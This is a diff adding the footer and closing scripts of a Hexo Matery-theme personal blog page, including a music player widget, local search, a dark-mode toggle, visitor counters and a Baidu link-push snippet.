+            } else {
+                $tocAside.addClass(expandedClass).show();
+                $mainContent.addClass('l9');
+            }
+            fixPostCardWidth('artDetail', 'prenext-posts');
+        });
+        
+    });
+</script>
+
+    
+
+</main>
+
+
+
+
+    <footer class="page-footer bg-color">
+    
+        <link rel="stylesheet" href="/libs/aplayer/APlayer.min.css">
+<style>
+    .aplayer .aplayer-lrc p {
+        
+        display: none;
+        
+        font-size: 12px;
+        font-weight: 700;
+        line-height: 16px !important;
+    }
+
+    .aplayer .aplayer-lrc p.aplayer-lrc-current {
+        
+        display: none;
+        
+        font-size: 15px;
+        color: #42b983;
+    }
+
+    
+    .aplayer.aplayer-fixed.aplayer-narrow .aplayer-body {
+        left: -66px !important;
+    }
+
+    .aplayer.aplayer-fixed.aplayer-narrow .aplayer-body:hover {
+        left: 0px !important;
+    }
+
+    
+</style>
+<div class="">
+    
+    <div class="row">
+        <meting-js class="col l8 offset-l2 m10 offset-m1 s12"
+                   server="netease"
+                   type="playlist"
+                   id="503838841"
+                   fixed='true'
+                   autoplay='false'
+                   theme='#42b983'
+                   loop='all'
+                   order='random'
+                   preload='auto'
+                   volume='0.7'
+                   list-folded='true'
+        >
+        </meting-js>
+    </div>
+</div>
+
+<script src="/libs/aplayer/APlayer.min.js"></script>
+<script src="/libs/aplayer/Meting.min.js"></script>
+
+    
+
+    <div class="container row center-align"
+         style="margin-bottom: 0px !important;">
+        <div class="col s12 m8 l8 copy-right">
+            Copyright&nbsp;&copy;
+            
+                <span id="year">2025</span>
+            
+            <a href="/about" target="_blank">q1n9</a>
+            |&nbsp;Powered by&nbsp;<a href="https://hexo.io/" target="_blank">Hexo</a>
+            |&nbsp;Theme&nbsp;<a href="https://github.com/blinkfox/hexo-theme-matery" target="_blank">Matery</a>
+            
+            <br>
+            
+                &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
+                        class="white-color">113.1k</span>
+            
+            
+            
+                
+            
+            
+                <span id="busuanzi_container_site_pv">
+                &nbsp;|&nbsp;<i class="far fa-eye"></i>&nbsp;总访问量:&nbsp;
+                    <span id="busuanzi_value_site_pv" class="white-color"></span>
+            </span>
+            
+            
+                <span id="busuanzi_container_site_uv">
+                &nbsp;|&nbsp;<i class="fas fa-users"></i>&nbsp;总访问人数:&nbsp;
+                    <span id="busuanzi_value_site_uv" class="white-color"></span>
+            </span>
+            
+            <br>
+
+            <!-- 运行天数提醒. -->
+            
+            <br>
+            
+        </div>
+        <div class="col s12 m4 l4 social-link social-statis">
+    <a href="https://github.com/lingqing777" class="tooltipped" target="_blank" data-tooltip="访问我的GitHub" data-position="top" data-delay="50">
+        <i class="fab fa-github"></i>
+    </a>
+
+
+
+    <a href="mailto:1625684832@qq.com" class="tooltipped" target="_blank" data-tooltip="邮件联系我" data-position="top" data-delay="50">
+        <i class="fas fa-envelope-open"></i>
+    </a>
+
+
+
+
+
+
+
+    <a href="tencent://AddContact/?fromId=50&fromSubId=1&subcmd=all&uin=1625684832" class="tooltipped" target="_blank" data-tooltip="QQ联系我: 1625684832" data-position="top" data-delay="50">
+        <i class="fab fa-qq"></i>
+    </a>
+
+
+
+
+
+
+
+    <a href="/atom.xml" class="tooltipped" target="_blank" data-tooltip="RSS 订阅" data-position="top" data-delay="50">
+        <i class="fas fa-rss"></i>
+    </a>
+
+</div>
+    </div>
+</footer>
+
+<div class="progress-bar"></div>
+
+
+    <!-- 搜索遮罩框 -->
+<div id="searchModal" class="modal">
+    <div class="modal-content">
+        <div class="search-header">
+            <span class="title"><i class="fas fa-search"></i>&nbsp;&nbsp;搜索</span>
+            <input type="search" id="searchInput" name="s" placeholder="请输入搜索的关键字"
+                   class="search-input">
+        </div>
+        <div id="searchResult"></div>
+    </div>
+</div>
+
+<script type="text/javascript">
+$(function () {
+    var searchFunc = function (path, search_id, content_id) {
+        'use strict';
+        $.ajax({
+            url: path,
+            dataType: "xml",
+            success: function (xmlResponse) {
+                // get the contents from search data
+                var datas = $("entry", xmlResponse).map(function () {
+                    return {
+                        title: $("title", this).text(),
+                        content: $("content", this).text(),
+                        url: $("url", this).text()
+                    };
+                }).get();
+                var $input = document.getElementById(search_id);
+                var $resultContent = document.getElementById(content_id);
+                $input.addEventListener('input', function () {
+                    var str = '<ul class=\"search-result-list\">';
+                    var keywords = this.value.trim().toLowerCase().split(/[\s\-]+/);
+                    $resultContent.innerHTML = "";
+                    if (this.value.trim().length <= 0) {
+                        return;
+                    }
+                    // perform local searching
+                    datas.forEach(function (data) {
+                        var isMatch = true;
+                        var data_title = data.title.trim().toLowerCase();
+                        var data_content = data.content.trim().replace(/<[^>]+>/g, "").toLowerCase();
+                        var data_url = data.url;
+                        data_url = data_url.indexOf('/') === 0 ? data.url : '/' + data_url;
+                        var index_title = -1;
+                        var index_content = -1;
+                        var first_occur = -1;
+                        // only match artiles with not empty titles and contents
+                        if (data_title !== '' && data_content !== '') {
+                            keywords.forEach(function (keyword, i) {
+                                index_title = data_title.indexOf(keyword);
+                                index_content = data_content.indexOf(keyword);
+                                if (index_title < 0 && index_content < 0) {
+                                    isMatch = false;
+                                } else {
+                                    if (index_content < 0) {
+                                        index_content = 0;
+                                    }
+                                    if (i === 0) {
+                                        first_occur = index_content;
+                                    }
+                                }
+                            });
+                        }
+                        // show search results
+                        if (isMatch) {
+                            str += "<li><a href='" + data_url + "' class='search-result-title'>" + data_title + "</a>";
+                            var content = data.content.trim().replace(/<[^>]+>/g, "");
+                            if (first_occur >= 0) {
+                                // cut out 100 characters
+                                var start = first_occur - 20;
+                                var end = first_occur + 80;
+                                if (start < 0) {
+                                    start = 0;
+                                }
+                                if (start === 0) {
+                                    end = 100;
+                                }
+                                if (end > content.length) {
+                                    end = content.length;
+                                }
+                                var match_content = content.substr(start, end);
+                                // highlight all keywords
+                                keywords.forEach(function (keyword) {
+                                    var regS = new RegExp(keyword, "gi");
+                                    match_content = match_content.replace(regS, "<em class=\"search-keyword\">" + keyword + "</em>");
+                                });
+
+                                str += "<p class=\"search-result\">" + match_content + "...</p>"
+                            }
+                            str += "</li>";
+                        }
+                    });
+                    str += "</ul>";
+                    $resultContent.innerHTML = str;
+                });
+            }
+        });
+    };
+
+    searchFunc('/search.xml', 'searchInput', 'searchResult');
+});
+</script>
+
+    <!-- 白天和黑夜主题 -->
+<div class="stars-con">
+    <div id="stars"></div>
+    <div id="stars2"></div>
+    <div id="stars3"></div>  
+</div>
+
+<script>
+    function switchNightMode() {
+        $('<div class="Cuteen_DarkSky"><div class="Cuteen_DarkPlanet"></div></div>').appendTo($('body')),
+        setTimeout(function () {
+            $('body').hasClass('DarkMode') 
+            ? ($('body').removeClass('DarkMode'), localStorage.setItem('isDark', '0'), $('#sum-moon-icon').removeClass("fa-sun").addClass('fa-moon')) 
+            : ($('body').addClass('DarkMode'), localStorage.setItem('isDark', '1'), $('#sum-moon-icon').addClass("fa-sun").removeClass('fa-moon')),
+            
+            setTimeout(function () {
+            $('.Cuteen_DarkSky').fadeOut(1e3, function () {
+                $(this).remove()
+            })
+            }, 2e3)
+        })
+    }
+</script>
+
+    <!-- 回到顶部按钮 -->
+<div id="backTop" class="top-scroll">
+    <a class="btn-floating btn-large waves-effect waves-light" href="#!">
+        <i class="fas fa-arrow-up"></i>
+    </a>
+</div>
+
+
+    <script src="/libs/materialize/materialize.min.js"></script>
+    <script src="/libs/masonry/masonry.pkgd.min.js"></script>
+    <script src="/libs/aos/aos.js"></script>
+    <script src="/libs/scrollprogress/scrollProgress.min.js"></script>
+    <script src="/libs/lightGallery/js/lightgallery-all.min.js"></script>
+    <script src="/js/matery.js"></script>
+
+    
+
+    
+    
+    
+
+    <!-- 雪花特效 -->
+     
+        <script type="text/javascript">
+            // 只在桌面版网页启用特效
+            var windowWidth = $(window).width();
+            if (windowWidth > 768) {
+                document.write('<script type="text/javascript" src="/libs/others/snow.js"><\/script>');
+            }
+        </script>
+    
+
+    <!-- 鼠标星星特效 -->
+    
+
+     
+        <script src="https://ssl.captcha.qq.com/TCaptcha.js"></script>
+        <script src="/libs/others/TencentCaptcha.js"></script>
+        <button id="TencentCaptcha" data-appid="xxxxxxxxxx" data-cbfn="callback" type="button" hidden></button>
+    
+
+    <!-- Baidu Analytics -->
+
+    <!-- Baidu Push -->
+
+<script>
+    (function () {
+        var bp = document.createElement('script');
+        var curProtocol = window.location.protocol.split(':')[0];
+        if (curProtocol === 'https') {
+            bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
+        } else {
+            bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+        }
+        var s = document.getElementsByTagName("script")[0];
+        s.parentNode.insertBefore(bp, s);
+    })();
+</script>
+
+    
+    <script src="/libs/others/clicklove.js" async="async"></script>
+    
+    
+    <script async src="/libs/others/busuanzi.pure.mini.js"></script>
+    
+
+    
+
+    
+
+    <!--腾讯兔小巢-->
+    
+    
+
+    
+
+    
+    <script type="text/javascript" src="/libs/background/ribbon-dynamic.js" async="async"></script>
+    
+
+    
+    <script src="/libs/instantpage/instantpage.js" type="module"></script>
+    
+
+</body>
+
+</html>
